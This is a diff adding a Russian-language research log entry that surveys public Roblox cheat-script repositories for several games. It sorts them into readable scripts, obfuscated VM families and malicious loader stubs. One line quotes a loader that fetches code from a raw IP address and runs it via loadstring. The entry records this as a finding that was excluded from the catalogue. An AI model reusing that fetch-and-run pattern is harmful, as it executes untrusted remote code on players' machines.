@@ -293,3 +293,24 @@ Luau (CodeGen → `work/luau-build/codegen-obj/`, линковка с `obj/*.o` 
 См. также `mod_userlogs.lua` в shindo (RECOVERY.md) — тот же паттерн (вебхук, данные
 игроков). Ни один из этих URL/вебхук не вызывался из песочницы; ни один токен
 в репозиторий не попал.
+
+## §6.2 Фаза 4 (2026-11-18): Grow a Garden / Adopt Me — тоже проверено, тоже отрицательно
+- `DemonJusticee/grow-a-garden-script/growagarden.lua` (21 KB), `riican/GrowAGarden/Main.Lua`
+  (18 KB, «Rehab+ Protect»), `BlazingBora/grow-a-garden-scripts/Pet and Seed Spawner` (20 KB):
+  одна и та же VM-семья (casino self-modifying constant soups, `getfenv()or _ENV`).
+  Проверено: PSU — «no PSU payload» ×3, CASCADE — «Failed to detect obfuscator»
+  (на BlazingBora). Восстановить нельзя; не включены.
+- `Jactil/Adoptmescript` (`Adopt me op script`, 184 B): чистая схема
+  `loadstring(game:HttpGet("http://72.56.90.233:3910/..."))` — загрузчик по плейн-text/plaintext-IP;
+  inline-тела нет; в каталог не включён.
+- `Zeal-2/Adopt-Me-Script`, `jayven-GaG/Grow-a-garden-script-no-key`,
+  `BilixTap/fisch-script`, `streamj642-afk/FischROBLOX`, `README`-only репозитории:
+  inline-тел нет.
+- Brookhaven / Da Hood: только stub-и/слитки (`YESLIKERJNDN/DaHoodScripts` нулевой,
+  прочее — loadstring-or-marketing); инлайн-тел о каких-либо режимов не нашлось.
+
+Вывод фаз 2–4: публичные «готовые скрипты» по мейнстрим-играм распределены на три класса —
+(1) plain и реально читаемые (катализированы: 99 Nights-цепочка, Bedwars, Gucci's Farm),
+(2) обфусцированные VM-семьями, которых наш сборочный стек не берёт (WeAreDevs/25ms/Rehab+),
+(3) вредоносные/загрузочные стабы (Nebula/BladeBall → не включён; Adopt-Me IP-loader → не включён).
+Шире искать есть смысл только по классу (1); классы (2)–(3) исчерпаны в пределах этого инструмента.
